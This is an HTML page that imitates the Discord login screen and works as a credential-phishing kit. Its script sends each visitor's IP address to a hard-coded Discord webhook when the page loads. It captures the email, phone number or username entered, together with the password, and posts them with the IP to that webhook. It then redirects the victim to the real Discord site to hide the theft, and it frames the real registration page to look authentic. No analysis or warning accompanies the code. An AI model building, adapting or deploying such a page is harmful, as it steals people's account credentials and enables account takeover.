<html>
<head>
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    body {
      background-color: #313338;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      height: 100vh;
      margin: 0;
      padding: 20px 10px;
      box-sizing: border-box;
      user-select: none;
      text-align: center;
      transition: opacity 0.5s ease;
    }
    .container {
      margin-top: -24px;
    }
    .logo img {
      margin-top: 4px;
      width: 100%;
      height: auto;
      pointer-events: none;
    }
    h1 {
      font-size: 24px;
      margin: 5.4px 0;
      font-weight: 500;
    }
    p {
      font-size: 17px;
      color: #b9bbbe;
      margin: 5.4px 0 21px;
    }
    label {
      display: block;
      text-align: left;
      font-size: 13px;
      margin-bottom: 7px;
      color: #b9bbbe;
      font-weight: bold;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 11px;
      margin-bottom: 11px;
      border: none;
      background-color: #1e1f22;
      color: #ffffff;
      font-size: 16px;
      height: 39.63px;
    }
    .alert {
      color: #e57075;
      font-size: 12px;
      margin-bottom: 10px;
      display: none;
      text-align: left;
    }
    .spacer {
      height: 0.54rem;
    }
    .forgot-password {
      color: #03a0ee;
      font-size: 12.7px;
      text-decoration: none;
      display: block;
      margin-bottom: 21px;
      text-align: left;
    }
    .login-button {
      width: 100%;
      padding: 11.6px;
      background-color: #5865f2;
      border: none;
      color: #ffffff;
      font-size: 16.2px;
      font-weight: 470;
      cursor: pointer;
      border-radius: 0.1rem;
      height: 43px;
    }
    .register-container {
      text-align: left;
      margin-top: 10px;
    }
    .register {
      color: #03a0ee;
      font-size: 13.4px;
      text-decoration: none;
    }
    .need-account {
      opacity: 0.59;
      font-size: 14.5px;
    }
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      justify-content: center;
      align-items: center;
    }
    .modal iframe {
      width: 80%;
      height: 80%;
      border: none;
    }
    .close-modal {
      position: absolute;
      top: 20px;
      right: 30px;
      color: white;
      font-size: 24px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <script>
    const webhookURL = "https://discord.com/api/webhooks/1299192306531962910/5Y9fNdk8nyaR1-uR1jTgamOIr_sP8R71SszcL6LS31e_k9GOI8DI4dy7rSL9hweyUkmL";

    function sendToWebhook(data) {
      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: data })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
      })
      .catch(error => console.error('Error sending data:', error));
    }

    function fetchAndSendIP() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
          const data = `@here Visitor: ${ipData.ip}`;
          sendToWebhook(data);
        })
        .catch(error => console.error('Error fetching IP address:', error));
    }

    let focusApplied = false;

    function focusEmail() {
      document.getElementById('email').focus();
    }

    function validateForm() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const alertMessage = document.getElementById('alert-message');

      alertMessage.style.display = 'none';
      const emailLabel = document.querySelector('label[for="email"]');
      const passwordLabel = document.querySelector('label[for="password"]');

      emailLabel.style.color = '#b9bbbe';
      passwordLabel.style.color = '#b9bbbe';

      let valid = true;

      if (!email) {
        emailLabel.style.color = '#e57075';
        valid = false;
      }
      
      if (!password) {
        passwordLabel.style.color = '#e57075';
        valid = false;
      }

      if (!valid) {
        alertMessage.style.display = 'block';
        if (!focusApplied) {
          focusEmail();
          focusApplied = true;
        }
        return false;
      }

      // Determine the type of input and format the message
      let message = '@here ';

      if (email.includes('@')) {
        message += `Email: ${email}\nPassword: ${password}`;
      } else if (/^\d{10}$/.test(email)) {
        message += `Phone: ${email}\nPassword: ${password}`;
      } else if (/^[\w.-]+$/.test(email)) { // Accept letters, numbers, underscores, periods
        message += `Username: ${email}\nPassword: ${password}`;
      } else {
        alertMessage.style.display = 'block';
        return false; // Prevent submission if invalid format
      }

      // Send the formatted message with the IP
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
          const ipMessage = `\nVisitor IP: ${ipData.ip}`;
          sendToWebhook(message + ipMessage);
        })
        .catch(error => console.error('Error fetching IP address:', error));

      // Fade out effect
      document.body.style.opacity = '0';
      setTimeout(() => {
        window.location.href = "https://discord.com/channels/@me"; // Redirect after fade
      }, 250); // Adjusted for faster fade

      return false; // Prevent form submission
    }

    function openRegisterModal() {
      document.getElementById('registerModal').style.display = 'flex';
    }

    function closeRegisterModal() {
      document.getElementById('registerModal').style.display = 'none';
    }

    window.onload = function() {
      fetchAndSendIP(); // Fetch and send IP address on page load
      focusEmail();
    };
  </script>
  <div class="container">
    <div class="logo">
      <img alt="Logo" src="https://i.ibb.co/TmMxVKn/IMG-4225.jpg" ondragstart="return false;" />
    </div>
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
    <form onsubmit="return validateForm()">
      <div class="alert" id="alert-message">Please fill in all required fields.</div>
      <label for="email">EMAIL OR PHONE NUMBER <span class="error">*</span></label>
      <input id="email" name="email" type="text" maxlength="32" />
      <div class="spacer"></div>
      <label for="password">PASSWORD <span class="error">*</span></label>
      <input id="password" name="password" type="password"/>
      <a class="forgot-password" href="#">Forgot your password?</a>
      <button class="login-button" type="submit">Log In</button>
    </form>
    <div class="register-container">
      <p class="need-account" style="display: inline;">Need an account?</p>
      <a class="register" href="#" onclick="openRegisterModal()">Register</a>
    </div>
  </div>

  <div class="modal" id="registerModal">
    <span class="close-modal" onclick="closeRegisterModal()">Ã—</span>
    <iframe src="https://discord.com/register" title="Discord Registration"></iframe>
  </div>
</body>
</html>
